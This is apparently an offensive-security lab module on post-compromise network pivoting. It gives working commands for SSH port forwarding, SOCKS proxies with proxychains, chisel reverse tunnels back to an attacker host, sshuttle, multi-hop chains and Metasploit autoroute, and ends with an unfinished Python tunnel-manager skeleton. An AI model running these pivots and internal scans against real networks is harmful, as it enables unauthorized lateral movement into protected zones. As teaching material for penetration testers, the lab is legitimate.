## 📖 Background

Enterprise networks are segmented into zones — DMZ, internal, management, production — separated by firewalls and access control lists. Once you compromise a host in one zone, pivoting lets you treat that host as a stepping stone to the next zone. The key insight is that your tools do not need to run on the compromised host; you can tunnel their traffic through it.

Key concepts:
- **Local Port Forward** — Binds a local port that tunnels traffic to a remote destination through the SSH server
- **Remote Port Forward** — Binds a port on the SSH server that tunnels traffic back to your machine
- **Dynamic Port Forward (SOCKS)** — Creates a SOCKS proxy for routing any TCP traffic through the tunnel
- **Proxychains** — Intercepts TCP connections from any tool and routes them through a proxy
- **Multi-Hop Pivoting** — Chaining tunnels through multiple compromised hosts
- **Autoroute** — Metasploit feature to add routes through Meterpreter sessions

## 🔬 Lab Instructions

### Phase 1: SSH Local Port Forwarding

1. Suppose you have SSH access to a perimeter host (10.10.10.50) and need to reach an internal web server (172.16.1.100:80):
   ```bash
   ssh -L 8080:172.16.1.100:80 user@10.10.10.50
   ```
2. Now browse `http://localhost:8080` — traffic is tunneled through 10.10.10.50
3. Forward a second service (e.g., internal SMB):
   ```bash
   ssh -L 4455:172.16.1.100:445 user@10.10.10.50
   ```
4. Access the internal SMB share through your local port:
   ```bash
   smbclient -L //localhost -p 4455
   ```
5. Verify the tunnel is active with `ss -tlnp | grep 8080`

### Phase 2: Dynamic SOCKS Proxy

1. Create a dynamic SOCKS proxy through the compromised host:
   ```bash
   ssh -D 1080 -N -f user@10.10.10.50
   ```
2. Configure proxychains to use the SOCKS proxy:
   ```bash
   # Edit /etc/proxychains4.conf
   # Ensure the last line reads:
   socks5 127.0.0.1 1080
   ```
3. Route nmap through the proxy to scan the internal network:
   ```bash
   proxychains nmap -sT -Pn -top-ports 100 172.16.1.0/24
   ```
4. Use proxychains with any tool (curl, sqlmap, etc.):
   ```bash
   proxychains curl http://172.16.1.100
   proxychains sqlmap -u "http://172.16.1.100/page?id=1" --dbs
   ```
5. Understand limitations: proxychains only supports TCP; UDP and ICMP do not work

### Phase 3: Chisel and sshuttle

1. When SSH is not available, use chisel for HTTP-based tunneling. On your machine:
   ```bash
   chisel server --reverse --port 8000
   ```
2. On the compromised host, connect back:
   ```bash
   ./chisel client 10.10.10.5:8000 R:socks
   ```
3. This creates a reverse SOCKS proxy — configure proxychains to use it
4. For a simpler VPN-like experience, use sshuttle:
   ```bash
   sshuttle -r user@10.10.10.50 172.16.1.0/24
   ```
5. sshuttle transparently routes traffic for the specified subnet — no proxychains needed
6. Compare chisel and sshuttle: flexibility vs. simplicity

### Phase 4: Multi-Hop Pivoting

1. Scenario: You have access to Host A (10.10.10.50), which can reach Host B (172.16.1.100), which can reach Host C (192.168.5.10)
2. Set up the first hop — SOCKS proxy through Host A:
   ```bash
   ssh -D 1080 -N -f user@10.10.10.50
   ```
3. Through the proxy, SSH to Host B and create a second tunnel:
   ```bash
   proxychains ssh -D 1081 -N -f user@172.16.1.100
   ```
4. Chain proxies in proxychains configuration:
   ```
   # /etc/proxychains4.conf
   [ProxyList]
   socks5 127.0.0.1 1080
   socks5 127.0.0.1 1081
   ```
5. You can now reach Host C through the double-hop tunnel:
   ```bash
   proxychains curl http://192.168.5.10
   ```
6. Alternatively, use SSH ProxyJump for cleaner multi-hop:
   ```bash
   ssh -J user@10.10.10.50,user@172.16.1.100 user@192.168.5.10
   ```

### Phase 5: Metasploit Pivoting

1. In Metasploit, use autoroute with an existing Meterpreter session:
   ```
   use post/multi/manage/autoroute
   set SESSION 1
   set SUBNET 172.16.1.0
   set NETMASK 255.255.255.0
   run
   ```
2. Start a SOCKS proxy server in Metasploit:
   ```
   use auxiliary/server/socks_proxy
   set SRVPORT 1080
   run -j
   ```
3. Route external tools through the Metasploit SOCKS proxy via proxychains
4. Scan the internal network through the pivot:
   ```
   use auxiliary/scanner/portscan/tcp
   set RHOSTS 172.16.1.0/24
   set PORTS 22,80,443,445,3389
   run
   ```
5. Document all active routes and tunnels for the engagement

## 🛠️ Build Your Own

**Build Objective:** Create a custom tunneling management tool for multi-hop pivoting

### Requirements
- Tracks all active tunnels (local, remote, dynamic) and their configurations
- Creates and tears down SSH tunnels by name
- Displays a visual map of the current pivot chain
- Validates tunnel connectivity before adding new hops

### Starter Framework
```python
#!/usr/bin/env python3
"""GRIMOIRE Tunnel Manager - LAB-015 Build Your Own"""

import subprocess
import json
import os
import signal
import sys

class TunnelManager:
    STATE_FILE = os.path.expanduser("~/.grimoire_tunnels.json")

    def __init__(self):
        self.tunnels = self._load_state()

    def _load_state(self):
        """Load active tunnel state from disk."""
        if os.path.exists(self.STATE_FILE):
            with open(self.STATE_FILE) as f:
                return json.load(f)
        return {}

    def _save_state(self):
        """Persist tunnel state to disk."""
        with open(self.STATE_FILE, "w") as f:
            json.dump(self.tunnels, f, indent=2)

    def create_local(self, name, local_port, remote_host, remote_port, ssh_target):
        """Create a local port forward tunnel."""
        cmd = [
            "ssh", "-L", f"{local_port}:{remote_host}:{remote_port}",
            "-N", "-f", ssh_target
        ]
        # TODO: Execute the SSH command and record the tunnel
        print(f"[+] Creating local forward: {name}")
        print(f"    localhost:{local_port} → {remote_host}:{remote_port} via {ssh_target}")

    def create_dynamic(self, name, socks_port, ssh_target):
        """Create a dynamic SOCKS proxy tunnel."""
        cmd = ["ssh", "-D", str(socks_port), "-N", "-f", ssh_target]
        # TODO: Execute and record the SOCKS tunnel
        print(f"[+] Creating SOCKS proxy: {name}")
        print(f"    SOCKS5 on localhost:{socks_port} via {ssh_target}")

    def destroy(self, name):
        """Tear down a named tunnel."""
        if name in self.tunnels:
            pid = self.tunnels[name].get("pid")
            # TODO: Kill the SSH process and remove state
            if pid:
                try:
                    os.kill(pid, signal.SIGTERM)
                except ProcessLookupError:
                    pass
            del self.tunnels[name]
            self._save_state()
            print(f"[-] Destroyed tunnel: {name}")
        else:
            print(f"[!] Tunnel not found: {name}")

    def list_tunnels(self):
        """Display all active tunnels."""
        if not self.tunnels:
            print("[i] No active tunnels")
            return
        print(f"{'Name':<15} {'Type':<10} {'Local Port':<12} {'Target':<30} {'PID':<8}")
        print("-" * 75)
        for name, info in self.tunnels.items():
            print(f"{name:<15} {info.get('type','?'):<10} {info.get('local_port','?'):<12} "
                  f"{info.get('ssh_target','?'):<30} {info.get('pid','?'):<8}")

    def show_map(self):
        """Display a visual representation of the pivot chain."""
        # TODO: Build an ASCII diagram showing the tunnel topology
        print("\n[*] Pivot Map:")
        print("    Attacker")
        for name, info in self.tunnels.items():
            print(f"      │── [{name}] ──→ {info.get('ssh_target', '?')}")
        print("")

if __name__ == "__main__":
    tm = TunnelManager()
    if len(sys.argv) < 2:
        print("Usage: tunnel_mgr.py {list|map|local|dynamic|destroy} [args]")
        sys.exit(1)

    action = sys.argv[1]
    if action == "list":
        tm.list_tunnels()
    elif action == "map":
        tm.show_map()
    elif action == "local" and len(sys.argv) == 7:
        tm.create_local(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6])
    elif action == "dynamic" and len(sys.argv) == 5:
        tm.create_dynamic(sys.argv[2], sys.argv[3], sys.argv[4])
    elif action == "destroy" and len(sys.argv) == 3:
        tm.destroy(sys.argv[2])
    else:
        print("Usage: tunnel_mgr.py {list|map|local|dynamic|destroy} [args]")
```
